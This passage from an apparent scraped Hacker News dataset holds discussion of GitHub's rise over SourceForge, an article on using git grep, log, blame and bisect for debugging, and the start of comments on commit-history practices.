Drupal Association has. Some democracy. reply adulau 18 hours agoprevI recall Gitorious, which isn't mentioned in this article. It was acquired by GitLab, which subsequently discontinued it in 2015. The standout feature has always been the social aspect and the ability to attract a large user base to a git forge. If platforms like Codeberg or similar forges enhance their social integration and capabilities, they could eventually become strong competitors to GitHub. reply eslaught 18 hours agoprevI believe I got my original GitHub invite from another HN user, back in the days when it was still invite-only. I confess at the time I didn't really \"get it\", despite having played with Darcs and the like prior to this. But (in retrospect), I don't think it's really that complicated. SourceForge, back in the day, had a really atrocious UI. As a highschooler navigating CVS and SVN repos for the first time, it was really difficult to figure out how to even download source code (this was especially horrific with CVS on Windows), let alone contribute in any meaningful way. Discussion on these sites required you to sign up for a mailing list. I think Gmail was just barely a thing, but prior to that as a student I would have been stuck with some awful Hotmail account or similar. Anyway, the hurdles were high and therefore this selected for \"serious\" contributions (or people willing to put up with a lot of obstacles). SourceForge may have supported some sort of bug tracker, but I don't remember ever interacting with a project that used it, so in practice people were splitting their various components (code, mailing lists, bug tracker) between several different sites. Ignore Git for a minute. GitHub, if nothing else, had a really slick UI. That UI put code front and center, so it was (finally!) obvious what sort of project you were actually looking at. I think it can't be underestimated how much this uniformity makes code easier to browse, as compared to the vast gulf in difference in quality between the best and worse homepages of open source projects prior to this. For fun, here's one that I authored back in the day. The home page here is actually kind of informative, but you can see how if this is all you get, the results are going to be all over the place: https://ip-interfaces.common-lisp.dev/ Beyond this, GitHub offered a permissionless collaboration. In the bad old days of open source, I could clone a repository, and I could write patches, but the cost of setting up forks was prohibitive. This is one of the things I didn't \"get\" at the time, but GitHub made it practically (and socially) acceptable to just fork whatever you needed, change something, and submit it. Or not, it didn't matter. Whether you intended for your experiments to be useful to anyone else or not, it dramatically lowered the cost of starting and maintaining those experiments. And that I think dramatically changed the face of open source software (for the better). reply hardwaregeek 19 hours agoprevIt's so frustrating how code hosting is like 10 years behind the big tech companies' internal tooling. Like GitHub is still terrible for stacked PRs, monorepos, code search, refactoring, etc. We're just starting to catch up with tools like Graphite, but in all honesty, Graphite should be a feature that GitHub made 10 years ago. I appreciate it being built now, but I question why it took this long. reply ivanjermakov 19 hours agoparentMeanwhile in non-big tech our company migrated from SVN to git last year... reply blt 5 hours agoprevthis is a good article, but this part near the end is a bit off: > ...as a market matures, solutions become specialized and modular. We've already seen this begin to happen in a few areas of \"social coding.\" Jira and Linear offer modular issue tracking, while Jenkins and Buildkite offer modular CI solutions. Those modules existed a long time before GitHub. Bugzilla was an issue tracker in the 1990s. Popular CI tools like Jenkins and Travis launched around 2010 while GitHub Actions didn't exist until 2018. reply anymouse123456 14 hours agoprevThey mention requiring human approval for a new repo on Source forge, but that was just a symptom of the fact that projects names came from a global namespace. It's hard to overstate how challenging this was. Some little exploration required this globally unique name and huge burden to come up with one. That was all before even applying. One of the truly genius moves that Github made, was to put projects behind each account namespace. It's my view that this is one of the core things that made GitHub so attractive to people. reply pentagrama 15 hours agoprevDesigner here, upon reading this, I found myself intrigued by Git [1]; it sounds awesome! Do you know if there is a free and open-source software version control like Git but for UI? I know in Figma there is version control, even branches. But I'm thinking about something not proprietary and not attached to a tool. And a more fundamental question, knowing Git, do you think that a version control for UI it is possible like what Git does for code? [1] https://en.wikipedia.org/wiki/Git reply csmattryder 18 hours agoprevA testament to how few of us used Microsoft's CodePlex that nobody really remembers it, and wasn't mentioned in the article. It had docs, issues and source code sections back then, but I can't remember if some of those features were spurred on by GitHub adding them first. reply jFriedensreich 13 hours agoprevI saw gitorious being mentioned in the comments and want to second that. The article missing that gitorious was the sleeker looking and most promising second contender after github until it was aquired and shutdown by gitlab seems odd. It still baffles me that gitlab never managed to make their product look or feel even half decent. Whoever will challenge github will look and feel more human and more like home not less. reply codexb 12 hours agoparentIMO, the Gitlab interface is better than github for most of the actual code features. Github still doesn't have a graphical tree view of the commit history. Hell, even the git CLI has that. The only thing I like better about Github is the dashboard for managing MR's/issues/notifications. Gitlab still hasn't managed to figure that out. Gitlab CI was also miles ahead of Github CI for a long time. Github is better now, but CI is one of the few things that really locks you into a vendor. Plus, Gitlab had much better enterprise pricing options for a long time. I'm not sure what it's like now. I don't have any numbers, but I suspect that Gitlab has more market share when it comes to locally hosted deployments. reply sgbeal 18 hours agoprevFWIW... i was an early adopter of SourceForge and absolutely loved it for the first few years. It was a godsend at the time. At some point (2004? 2006?) its web interface became so ad-ridden that it was effectively unusable, and that was what drove me away from SourceForge. reply jdorfman 14 hours agoprevI remember signing up for GitHub and having to provide my public SSH key before creating an account which I did. I can’t imagine how many abandoned signups there were. I think Chris tweeted about it. reply nomilk 19 hours agoprevCode hosting seems to be a natural monopsony. Github does a good job by and large, and it would be a bit of a PITA for users to have to navigate a bunch of similar, competing websites for no substantial additional benefit. reply Zambyte 18 hours agoparentWhy? I never have any trouble bouncing between GitHub, Gitlab, Gitea instances, SourceHut instances, cgit servers... You can just git clone and away you go. reply Macha 18 hours agorootparentIt's true as a user that switching is relatively easy. As a contributor it's a little harder, more so for stuff with non standard processes like sourcehut or cgit. As a maintainer there can be much more significant differences around bundled features like CI systems and issue trackers. (Though I am of the opinion that where possible, CI should just be calling makefile steps or your language's tooling equivalent) However, I agree that this is ultimately not a huge barrier. Despite that, it's clear that users won't cross that barrier. As a project maintainer on not-github, you'll get less attention, less feedback, less contributions on other platforms. I think there's a bit of a relation to how sticky services like search engines are despite 0 barrier to switching. So that's something that you will need to weight up when choosing a platform, regardless of whether you as maintainer have difficulty doing the switch or think others do. Maybe maximising contributions isn't an important goal for you, but I can see why many projects before have made that decision. reply zilti 11 hours agorootparent> stuff with non standard processes like sourcehut Of all the forges, Sourcehut arguably has the most standard processes - mailing lists for issues, and git-send-email for contributions. I especially love the latter, because it means I don't have to register and create a repo fork etc. just to contribute a patch. reply Macha 9 hours agorootparentIn 2024 the reality is, without playing silly word games about the meaning of standard, email patches and mailing lists are non-standard (and arguably have been since the early 10s) reply Asmod4n 16 hours agoprevSourceForge also had the annoying UX where you couldn’t just create or upload a repo, they had to allow it to be uploaded. GitHub not having anything like that made it way more useful. reply ompogUe 18 hours agoprevSourceForge, Slashdot and Freshmeat all seemed to go downhill hand-in-hand to me. Bought and monetized and sold and bought and sold and monetized. reply RadixDLT 14 hours agoprevSourceForge was badly designed and was of no interest to the average developer reply kijin 18 hours agoprevThe article does a good job explaining why GitHub won the developer mindshare, but there was also end user mindshare. Unlike GitHub, where the source code is front and center, SourceForge always prioritized showing a project introduction page with screenshots and a big download button for the end user. SourceForge is where non-developers went to download cool freeware. It was like F-Droid for Windows. It was meant to be the official website for the projects it hosted, which is why it didn't host forks. But the market for end users who download executables from random websites has been shrinking rapidly for two decades. Nowadays, either you're a developer and care about the source code, or you're an end user and just want to install that app from your favorite app store. Not to mention that most active open-source projects these days are made for other developers and not end users, so there's no point hosting them on a platform designed for end users. reply sidcool 18 hours agoprevSourceForge fell to its greedy overlords and started shipping malware. reply mandeepj 16 hours agoprevSourceForge stagnanted and UI was messy reply ipunchghosts 11 hours agoprevSource Forge failed when it started bundling mallard with binary downloads. Case closed! reply j45 14 hours agoprevSourceForge was never that good. It was the default. Then it went through some questionable changes. Similar to ExpertsExchange... being uprooted by Stack Overflow when they started to try and monetize their database in a less than popular way. Github also came out around the time Git was maturing just enough, and subversion wasn't really pushing into collaborative features. Now we see tools like Gitlab starting to get the abilty to customize and integrate with other things. reply zzzeek 18 hours agoprevsourceforge was like a big klunky 8-track tape player of open source hosting. it was awful, and it's all there was. literally anything that people put up and managed to publicize a bit would have replaced it. a more interesting question is why did Github win out over Bitbucket (I know the answer to this also, it begins with Mercurial and ends with \"Atlassian buys them\", but in the middle it gets into interesting questions about source control systems, issue trackers, etc). reply samtho 18 hours agoprev [–] There a small bit of irony that it required a fully decentralized source control management in order to consolidate the market for OSS code/project hosting. The obvious caveat is that git allows any project to pack up and leave anytime they want, but the vendor lock-in came by means of the network effect and developer preference. There is an incentive on GitHub, at least, to provide a superior product to other alternatives like Gitlab or Bitbucket. Ultimately, it meant the risk of choosing GitHub was very low due to the nonexistent vendor lock-in. During SourceForge’s decline, most OSS projects were either very prolific, general purpose libraries or full software packages, all of which had most of their infrastructure sorted. There were a number of other platforms, now mostly forgotten, that tried to acquire the displaced market shed from SF’s former userbase. Almost every one of the new platforms wanted to just be a better SourceForge, but none of them wanted (or thought to) to tackle the problem of git hosting as their primary product they were selling to users - which ultimately proved to be what the market wanted. OSS devs with a project likely already had an issue tracker, website, discussion forums, etc, and they didn’t want to spend their day in a CRUD app manually managing releases and fielding support requests on a platform that different from what they setup already. GitHub offered public git repository hosting with a modern look that was betting on companies buying commercial-oriented features as a monetization strategy, rather than ads. Eventually, a-la-carte features such as issues, discussions, and wiki were added, but were able to be toggled at the project-level. Meanwhile, SourceForge was too busy cramming more ads in, cluttering layout, trying out asinine social media integrations, and ultimately, accelerating their (at this point) well-deserved) death by packaging malware/adware in software distributions. It was easy to see in the moment (and even more in hindsight) how much of a loser strategy this was for SF. It’s almost comical how spectacularly they fucked up their own market share with short-term thinking and outright stupid ideas. Not much love was lost here by the end. Without GitHub, npm would not have been successful (which itself inspired other package managers), CI/CD would either be a bigger mess or dominated by a single vendor (which enabled fun stuff like infrastructure-as-code), coding in general would not be as accessible, and git itself may not have won out as heavily as it did. GitHub’s success is a good case study in a startup being at exactly the right place at the right time, with the right product. The result wasn’t the mass migration of prolific projects immediately moving in, rather it enabled this back-pressure of micro-OSS projects to thrive because now it became viable to build a library that does one thing really well without the admin work of managing a full-blown OSS project. A number of projects eventually moved in, but the driving force to adoption, in my opinion, were the tiniest projects that ultimately proved this platforms viability. reply saurik 17 hours agoparent [–] > The obvious caveat is that git allows any project to pack up and leave anytime they want... People always say this but it just isn't even remotely true. Even if we ignore the \"obvious\" issue of, well, issues and other important project data that isn't part of your git repository, if you try to \"pack up and leave\" you will rapidly find that your github.com URL is now distributed around the entire internet as if it were your home page and is even embedded into other peoples' build scripts as the core problem was never the data you are hosting but is actually the identity and address of that data. The reality is that GitHub using git is no different from any other hosting platform, such as Instagram or YouTube. Yes: your content on YouTube is \"merely\" a bunch of video files and those video files could just as easily be hosted on any other video hosting provider as video files are about as boring and standardized and portable as can be imagined, yet obviously we wouldn't say anyone can trivially \"pack up and leave\" their decade of investment into a popular YouTube channel. reply skydhash 7 hours agorootparent [–] And that’s why your platform should be a website under your domain name. If I want to refer to a particular project, I go to their website first, and use the link there for the source code. There are too many mirrors repo on github to trust the first username I see. For most popular projects I use, I never care about their github page other for checking the code and issues page. It’s either their docs or the cloned version on my computer. The last project I interacted with was Authelia and I’ve not opened the github page once (if they even use github) reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "GitHub has become the industry standard for code management, thanks to its user-friendly platform for hosting and collaboration, revolutionizing the sector.",
      "Despite challenges and competitors, GitHub remains dominant, continuously evolving with specialized features that could open up opportunities for further industry diversification."
    ],
    "commentSummary": [
      "SourceForge's decline as a top code hosting platform is due to malware distribution and user experience problems, leading users to switch to GitHub, known for its usability, Git support, and sleek interface.",
      "The shift from platforms like SourceForge to GitHub has transformed open-source software development and collaboration, despite worries about centralization and constraints.",
      "GitHub's status as a premier hosting platform for programming projects persists, remaining dominant in the field."
    ],
    "points": 165,
    "commentCount": 144,
    "retryCount": 0,
    "time": 1711804692
  },
  {
    "id": 39877637,
    "title": "Using Git for Debugging: Mastering Commits, Branches, and More",
    "originLink": "https://lucasoshiro.github.io/posts-en/2023-02-13-git-debug/",
    "originBody": "Git as debugging tool 19 minute read Are you sure? Debugging with Git?Permalink What are the tools that comes on your mind when someone say “debug”? Let me guess: a memory leak detector (e.g. Valgrind); a profiler (e.g. GNU gprof); a function that stops your program and gives you a REPL (e.g. Python’s breakpoint and Ruby’s byebug); something that we call a “debugger” (like GDB, or something similar embedded on the IDEs); or even our old friend, the print function. So, in this text I’ll try to convince you to add Git to your debug toolbelt. When you are versioning some code with Git, the repository is a precious source of information. A lot of people only think of it as the command that they use to git add, git commit and finally git push their work the same way as they upload a file to Google Drive or post a photo on Instagram. However, as Git keeps the whole history of commits since the oldest one, it is perhaps the tool that knows the most of the code. Every version of every file is stored in the repository (in this text I’m referring the local repository as “repository”, not the GitHub, GitLab, Bitbucket, etc repository), and it’s a work of archaeology to find useful information in there. So, I’ll show here some useful concepts and tools to extract everything you need from there! Git basics recapPermalink Before we go on, let’s first recap the Git basics. Commits are the “versions” of a repository. They are snapshots, not deltas, that means that a commit doesn’t know what has changed. Instead, a commit stores the content of every file. When you run git show, you are not showing the content of a commit, you are showing a patch, the change in relation to its parent. That storage, however, is done in a clever way in order to save space. Commits have references to their parent commits: one parent in a normal commit; two parents in a merge commit; two or more parents in a octopus merge commit; no parents if it’s a initial commit. Commits also stores when and who created them! Branches are only references to commits. In fact, a branch is only a file containing a hash of a commit. The commit history is not a linear timeline! Actually, it is a DAG, a directed acyclic graph, in other words, it is set of different timelines that may have a common past between them (a fork point) and that may have a state where both timelines join (a merge commit), but without any loops! The staging area, formerly called cache (still used sometimes…) and internally called index is the place where a commit is prepared (in other words, the place where you send you file when you git add it). The content of the staging area is the content of your last commit with the changes that you made and added using git add (the ones that are shown in green in git status). The working directory is the directory where you files are in you disk. From the perspective of view of who is writing and running code, this may look as the main area of Git (compared to the commit history and the staging area). However, from the perspective of view of Git, this is the least important, as everything here can be modified, deleted, created and Git won’t track it, unless, of course, you explicitly tell Git to do that (using git add, for example). If you didn’t know something from this section, I strongly recommend you to read the section 1.3 from the Pro Git book. Pathspec and git ls-filesPermalink So, let’s go to our first concept here: the pathspec (as a non-native English speaker, I struggle to say that word…). A Pathspec is a string that can be passed as argument to several Git commands to specify files. A nice way to see the pathspecs in action is using git ls-files. That command lists all the files in the staging area, but if you pass a pathspec as an argument for it, it will list all the files in the staging area that matches the pathspec. The most trivial pathspec is the path of a file. If you have a file called README.md, then README.md will be a pathspec that represent it, and if it is inside a directory called src, a pathspec for it is src/README.md. Note that, by default, pathspecs are relative to the current directory. *Permalink The first superpower of the pathspec that I’ll show you is *. That character matches any characters. For example, this command lists every file that ends in .c in the staging area that are in the current directory or in its subdirectories, recursively: git ls-files '*.c' You may be thinking: “nothing new here, it is just a shell star expansion”. Well, no. Note that '*.c' is between quotation marks, this means that it’s a string, and the shell is not expanding it. Instead, Git is expanding it. What’s the difference? Remember that I said “in the current directory or in its subdirectories”? This is the difference between the pathspec * and the shell *: in this situation, the shell * will only match files in the current directory, while the pathspec * will match files that are in the current directory or in a subdirectory of it. So, if we run: git ls-files *.c the shell will replace *.c by all the files that end in .c in the current directory, so git ls-files will only list them. : + magic wordsPermalink : is a special character in pathspecs, that is followed by a magic word. I’m not going to deep dive into it, but there are two cases of it that I find very useful. The first one is :/. This means the root of the repository. So, if you are in a subdirectory and want to match something by its absolute path (that is, relative to the repository root), you need to use :/. For example, :/*.c will match all the files that end in .c in the repository, no matter where they are located. The second one is :!. If we put a :! in the beginning of a pathspec, then the pathspec will match all the files that doesn’t match the rest pathspec. For example: git ls-files ':!*.c' That command will list all files in the staging area that don’t end in .c. More about pathspecs and git ls-filesPermalink Pathspecs are really useful to select files to pass as arguments to Git. You can learn more about them on the Git glossary (man gitglossary), searching by “pathspec”. git ls-files, that I used as an example for pathspecs, is also a good tool to find files in the repository. It can replace the command find, as it has a cleaner syntax than the latter. Git GrepPermalink git grep, as the name says, is a grep powered by Git. So, what does it mean? Well, remember that I said the Git is perhaps the tool that knows the most about your code? git grep takes advantage of it to make a better grep! The syntax of git grep is, basically, the following: git grep [] [] [] -- [] You can use several flags of grep in git grep, for example, -E, -P or -i. The pathspec and the commit are optional. The -- is optional in most of the cases, however, it is recommended to use it to avoid ambiguities. If you provide a commit, than Git Grep will search for the pattern on that commit. However, Git grep won’t search on other commits. If you don’t provide the pathspec, it will search for a pattern on all files in the current directory or its subdirectories. It is really faster than GNU Grep or BSD Grep. You can see that in the following image, I’m searching #include on the Git source code using BSD Grep, GNU Grep and Git Grep: Git grep vs BSD grep and GNU grep, on a Macbook Air M1 Nice, but what more Git grep can do? Well, take a look at the flags --heading and --break. --heading groups the output by the file where each line is, and --break only inserts a line break between the groups. This is very useful for searching, for example, the files that call a function or that use a constant. Git grep with --heading and --break, searching for looks_like on every C file. A very cool feature of Git Grep is the flag -W (or --show-function). When using it, Git grep will not only show the line that contains what you are searching, but it will also show the entire function where it is located. So, let’s check the same command the I’ve shown in the last picture, however, adding the flag -W ( git grep --heading --break -W 'looks_like' -- '*.c'): Git grep with -W showing the entire function that contains looks_like Git Grep is an amazing tool to find code. Ok, but you may be thinking “nice, but I can do something like that using the code navigation of my IDE, jumping to definitions and usages”. That is true for several cases. However, Git Grep is still very useful when you want to search only in certain files (using the pathspec as a restriction), when you want to search for a generic regex instead of a name of variable or function, when you want to search in another commit or when you just don’t want to open an IDE and want to search directly from the terminal. It’s not a tool that is replacing another, but a tool to complement the other. Git BlamePermalink If you ever used git blame, there’s a good chance that you are expecting me to say something about it and how it is wonderful. If it is the case, please, don’t skip this section because I have something very important to tell you. If it’s not the case and you never heard or never used git blame, it is a tool that shows for every line who was the last person that changed that line, the commit where it was done, and the timestamp of it. Look at the following picture. I’m running git blame Main.hs, where Main.hs is a file that I wrote: Git blame. The first column show the first characters of the hash of the last commit that changed the line, Main.hs is the file, Lucas Oshiro (also known as me) is the last person that changed those lines. You can also see the timestamp of the last change. That’s cool, so, does this show evidences so I can curse the code of my colleague? Well, in most of cases, yes, however, remember: git blame shows only who made the last change. Maybe that person only changed the name of a variable, applied a codestyle change, moved a function declaration to another file or many other things that the change was almost irrelevant to the code behavior. Many times the person doesn’t even know what the code does (for example, that person only ran a tool that formats code, without even reading it). This also applies to the other information: the timestamp that is shown is only the last time that the line was changed, and it doesn’t tell us when it was created. Same for the commit: the commit that is shown is the last commit that changed something on that line, not that last commit that changed something useful or the commit that introduced that line. Git Blame (and tools based on it, like Annotate on JetBrains IDEs, magit-blame on Emacs or GitLens on VSCode) is of course very useful, however, it is not the source of the truth. If you need to find something more than know about the last change of a line, then you’ll need something more powerful… Git Log and its hidden powersPermalink git log is one of the most famous commands of Git. It is the command that you run to look the commit history, nothing new here. However, it has some lesser known features that I consider the next step when Git Blame is not enough for your needs. Passing a pathspec as an argument to Git logPermalink You can restrict the git log output by passing a pathspec as the last argument, like this: git log -- . Again, the -- can be omitted in most of the cases, however, it is good practice to keep it to avoid ambiguities. When you do that, the output will contain only the commits that introduced a change to the files that match the pathspec in relation to their parents commits. Look at this example: Commit history of a file. If you want to know when something was introduced, you can inspect those commits. When you find it, you will know who and when introduced the commit. If the commit message is well-written and if the change was atomic, you can even know why the commit was created (and why its code exists). If you are using GitHub, you can also copy the hash of that commit and search the PR that contained it, and its even more information, given that you can read the discussion and the code review! This feature of Git Log saved my life several times. If I found a piece of code that was hard to understand its purpose, instead of only trying to read it, I used Git Log to find the commit that introduced and check what the person that wrote it was trying to do, what was the context of its creation, what was the problem it was aiming to solve, and so on. Just try it! The -p flagPermalink So, it may be boring to inspect every commit manually. You can use -p to show the patch of every commit. In other words, it is like running git show for every commit in the log. The same as the last picture, but using the -p flag The -S flagPermalink The -S flag is a hidden gem in Git log. With it, you can see all the commits that increased or decreased the number of occurrences of a string. This works almost as Git Blame killer for me: even if someone moved a piece of code to another place or another file, git log -S will find the introduction of it. In the following picture, I’m using git log -S to find the first introduction of a string contained in the file hardcoded_values.h (as you can see in the output of the first git grep). Then, note that the introduction of that string wasn’t in that file (as you can see in the output of the second git grep). Firstly, it was part of state_machine.c, then it was moved into the other file. This solves the problem of Git Blame blaming the person that moved the line, instead of the one that created it. Sorry, Git Blame... You can also use -G instead of -S. This allows you to use a regular expression instead of string. Git BisectPermalink git blame tell us the last change of a line and git log -S tell us when a when string was introduced or removed. However, they only work over text. For many cases this is enough, however, sometimes you don’t want to look for changes in a text, but you want to look for changes in the behavior of the program, like bugs or anything that is not working as expected. In those cases, git blame or git log -S won’t be enough, because you don’t know what code caused that change of behavior, and you don’t know exactly what to search. In complex projects, maybe that change is in a place that you would never expect, for example, a class or function that you thought it wasn’t related to the one that is broken. And how can Git can help us to find that change? Ladies and gentlemen, it’s a honour to present you my favorite Git command: Git Bisect! It allows us to find the commit that broke something. Given a “good” commit (a commit that is not broken, created before the introduction of the bug), and a “bad” commit (a commit that certainly is broken), Git will perform a binary search until the broken commit is found. After bisecting, you can take a look at the commit that created the bug, and find all the information that we discussed previously. Git Bisect can be used in two ways: a manual one, where it guides you until you find the commit that introduced the bug, and an automatic one, where Git find that commit for you. A practical exercisePermalink I’ll demonstrate Git Bisect using this repository: https://github.com/lucasoshiro/bisect_demo. It is very simple, it contains only one Python script, with a really weird and hard to understand code: #!/usr/bin/env python3 from sys import argv from math import log ops = 0x2B2D2F2C2A5E3E5F def func(a, b): return ''.join( (lambda r: f'{a} {f} {b} = {r}')(eval(f'{a}{f}{b}')) for f in ops.to_bytes((int(log(ops, 16)) + 1) // 2, 'big').decode()) if __name__ == '__main__': a, b = map(int, argv[1:]) print(func(a, b)) And what does it do? Well, it takes two numbers as arguments, and it performs some operations using them: calc.py running This works for mostly any numbers, except if the second one is 0. As one operation is division and we’re not handling division by zero error, this input breaks the script: Oh no As you can see, we know where the code is breaking, however, we can’t see a division in there. If we want to fix this code, we need to find what causes that division, and it’s not clear here. Of course we can use git log here and try to find a commit that may inserted the bug. However, even running git log -p -- calc.py can’t help us, look: Nothing useful here. The commit messages says nothing about the code (they are name of fruits in Portuguese...) and the only change between one commit and another is a hex value. Git Bisect to the rescue! Running Git Bisect manuallyPermalink The first thing that you need to do is to start to bisect. You do this by running git bisect start. If you run git status, it will tell you that you are bisecting. Some shells that shows Git info on the prompt also shows tells you that you are bisecting. If you are done with bisecting, then you should run git bisect reset to end the bisection. Bisect start I said that in order to bisect you need a “bad commit” and a “good commit”. In this case, we know that the last commit is a bad one, as it breaks when providing 0 as the second parameter. In a real scenario, you’ll probably would know what is a “good commit”, it is any commit that you know that contains a code that works, for example, a commit of the last release that is not broken. In this case, I’m telling you that the initial commit is not buggy. Just checkout to it and try to run calc.py passing 0 as the second argument: It does nothing, however, at least it is not diving by zero So, now we know the bad and the good commit, our current situation is that (the first one is the first commit): 8959689 Início0 to find if this commit is a good or a bad one. Turns out that this commit is a bad one... Ok, now our situation is that: 8959689 Início0, check whether it breaks or not, if so run git bisect bad, otherwise run git bisect good, until it ends the binary search and finds the buggy commit. We’re doing it here: Running git bisect bad and git bisect good until the end of the binary search Then we found the commit that introduced the bug: 0acc414 (Laranja). Now you exit bisecting with git bisect reset, then it will checkout to the same commit where you were when you ran git bisect start. If you are curious about why that change breaks the code, here’s a clue: 0x2F is the hex value of the ASCII number for /. Git Bisect is cool, but running it manually like this (checking if the commit is a good or a bad one and running git bisect bad or git bisect good) can be very boring. Depending on the situation, you can do that automatically using git bisect run! Running Git Bisect automaticallyPermalink If there is a command that can tell you if the commit is good or bad, then Git Bisect can perform the binary search automatically! That command can be anything, like a shellscript, a Python script, an executable, a test, and so on. The only requirement about it is its status code: If the commit is good, then the command should return 0; If the commit is bad, then the command should return anything between 1 and 127, inclusive, except 125; If it is not possible to tell if this commit is good or bad, then it need to be ignored, and the command should return 125. In this example, we are checking if the code raises an exception. By default, when a code exits with an exception in Python, its status code is 1, and it is 0 when everything is ok. Then, just running ./calc.py0 is enough, as it will return 0 when it is ok and 1 when the bug happens. However, keep in mind that is not always the case, and maybe you’ll need to write a test script. We start the bisect just like before: git bisect start git bisect goodgit bisect bad However, as we want to do perform the bisection automatically using as criterion ./calc.py 14 0, we run git bisect run ./calc.py 14 0. It works like magic: Yes, my friends: this is command that finds the bug for you! After this, you also need to run git bisect reset to end bisection. That’s it. Isn’t it cool? ConclusionPermalink These commands helped a lot when I needed to navigate on large codebases and find the causes of a bug. But not only that, they can help you to understand the code, as they are, essentially, search tools. Simple and flexible, but incredibly powerful. Thanks for reading, if you find something wrong, or if you want to suggest something, open a issue on my GitHub. Updated: February 13, 2023",
    "commentLink": "https://news.ycombinator.com/item?id=39877637",
    "commentBody": "Git as a debugging tool (lucasoshiro.github.io)159 points by lucasoshiro 14 hours agohidepastfavorite43 comments teeray 5 hours agoRemember that the more you treat commit history as something to be read, the better these tools get. If you’re just jamming “-m” on `git commit` with nonsense like “fix bug”, “pr comments”, “ci”, then you’re going to have a bad time debugging with Git. Also, if you have mandatory squash and merge, congrats, you’re destroying history all the time that can help you debug things. reply MichaelMug 3 hours agoparentThis is one of the biggest issues I face at work. I always see \"added X\", which git can already tell me. > Also, if you have mandatory squash and merge, congrats, you’re destroying history all the time that can help you debug things. Well the alternative is 100s of commits like this: fix bug added file fix typo fix typo update test test test test fix typo added file reply oaw-bct-ar-bamf 41 minutes agorootparentOurs isn’t much better. Each commit message has a mandatory ticket number you have to enter. So for details you need to jump to the ticket. The tickets often don’t have meaningful information in them apart from ‚for details see the attachments‘ Attachments are often either not uploaded or nowadays we do not have read access as they were created by a different team working for a different customer but forwarded to the ‚central backend team’ and for know how protection purposes we are not even allowed to see the attachments. Effectively resulting in the information that is available telling us: ‚we did stuff‘ reply dllthomas 3 hours agorootparentprevThat's one alternative. Another alternative is cleaning that up in a rebase into a series of (hopefully) easy to follow individual commits that do one thing, and then a merge commit pulling in the branch with a description of the change as a whole (and a reference to the pr and any relevant tickets). There are other alternatives as well that make various tradeoffs between effort for the author, effort for the reviewer, ease of reading the git history, applicability of various tools, etc. reply williamdclt 47 minutes agorootparentI think you start from a different opinion of what a PR looks like. You say “commits that do one thing”, but in my workplace PRs already are supposed to be small and do one thing: I _want_ them to be squashed into a single atomic commit that’s easy to revert if needed reply keybored 12 minutes agorootparentIMO PRs are supposed to do one thing. But they might end up doing a few more things like refactor, clean up whitespace, or even add a new function in order to facilitate the change. And all of these can be put into their own commits. Now you can make like five PRs for each of those commits. But that seems similar to making fiveissues for those commits. You’re already there in the PR. You might not need the overhead of N external items for N commits. reply a_e_k 2 hours agorootparentprevYes, I'll never understand the \"fix typo\" commits when `git commit --amend` is so straightforward. reply williamdclt 50 minutes agorootparentAs a reviewer, —amend means I need to reread the whole commit to see what changed. A tiny commit means it takes me seconds. My opinion is that a PR should be small enough that it’s desirable to have it squashed into a single commit at the end anyway. reply keybored 9 minutes agorootparent> As a reviewer, —amend means I need to reread the whole commit to see what changed. A tiny commit means it takes me seconds. A `git commit --fixup` commit can be made which does that. Then when the review is done `git rebase -i --autosquash`. Like squashing but with fine-grained control. reply matijsvzuijlen 31 minutes agorootparentprevThe idea is that --amend would be used before pushing the commit that it amends, and so before a reviewer ever sees the original commit. reply pjerem 19 minutes agorootparentThe idea of PR review is that the submission is imperfect and that there will be fixes. Like, \"typo fix\" fixes. reply Terr_ 2 hours agorootparentprevBetter-still is `git commit --fixup {rev}` and `git rebase -i --autosquash`, since then the fix(up) can be placed into the most-appropriate commit, which isn't necessarily the most-recent one. Of course, that assumes a you're already got a workforce that is able to do resolve minor conflicts when something else near the typo got tweaked in a separate commit, so I'll grant that `--amend` is easier when starting out. reply tux3 1 hour agorootparentBetter still, git-absorb figures out in which recent commit your fixups should go on its own (based on which file it touches) reply manojlds 1 hour agorootparentprevWe can do rebase and squash on our side while also developing with silly commits but not pushing them. reply whoitwas 4 hours agoparentprevAgreed. A good policy is to include ticket number and a short description. reply globular-toast 1 hour agoparentprevThe point of squash is that the \"history\" is nonsense like \"fix\" etc. There are two types of commit: versions and checkpoints. The latter are just to help you develop and can include stuff like \"end of day\" that should never end up on master. Squashing is a way to turn those into versions. Blindly squashing every branch down into one commit is stupid, though. reply keybored 7 minutes agorootparent> The point of squash is that the \"history\" is nonsense like \"fix\" etc. […] Using squash when appropriate is good. But then it should be generalized to “rebase” since that doesn’t ever imply a certain strategy like “squash everything”. > Blindly squashing every branch down into one commit is stupid, though. Yep, which is what OP is complaining about (mandatory squash). reply ozay 12 hours agoprevgit blame shows only who made the last change. Maybe that person only changed the name of a variable, applied a codestyle change, moved a function declaration to another file or many other things that the change was almost irrelevant to the code behavior. There are a few options that help you out with this: -M Detect moved or copied lines within a file -C In addition to -M, detect lines moved or copied from other files that were modified in the same commit. --ignore-revIgnore changes made by the revision when assigning blame, as if the change never happened --ignore-revs-fileIgnore revisions listed in file https://git-scm.com/docs/git-blame reply eru 7 hours agoparentI wish they would make long option names for everything, including -C and -M. (Perhaps I should contribute that..) I use short options interactively on the command line, but in scripts and when communicating with other people, I prefer longer options because they are self-documenting and can catch most typos. (For a long option, typos are more likely to result in an invalid option, and thus an error message. For one-letter options, a typo could result in anything..) reply PhilipRoman 12 hours agoparentprevI recommend just skipping blame and going to git log -L to see the full evolution of a range of lines, I set up a little keybind in vim which does this for the current visual selection and it works much better than blame. reply a_e_k 11 hours agorootparentAnd for those using Magit in Emacs, you can do this by selecting a region of lines and hitting `C-c M-g l`. https://magit.vc/manual/magit/Commands-for-Buffers-Visiting-... reply karthink 2 hours agorootparentThis feature is built into Emacs, no Magit needed. It's the vc-region-history command, bound to `C-x v h` by default. It works across all version control systems Emacs supports, not just git. reply agumonkey 10 hours agorootparentprevThere's also git time machine to quickly rollback a buffer in place reply jmholla 10 hours agorootparentprevNice. Can you share your vim configuration for that? reply PhilipRoman 3 hours agorootparentMy config is kind of cluttered so this is a simplified version without dependencies. Glogr is for range history, GLogf for file history and gc for showing a commit based on hash: nnoremap gc :Gshowcommand! -nargs=1 Gshow enewset ft=diff buftype=nofile0r!git log -p -n 1 \"\" command! -nargs=0 Glogf tabnewset ft=diff buftype=nofile0r!git -C \"#:h\" log -p --follow \"#:t\" command! -nargs=0 -range Glogr tabnewset ft=diff buftype=nofile0r!git -C \"#:h\" log -L \",:#:t\" reply izoow 8 hours agoprevI recently found out that git rebase has a --exec option that allows you to execute a shell command for each commit. If the command fails, the rebase pauses and allows you to make changes to 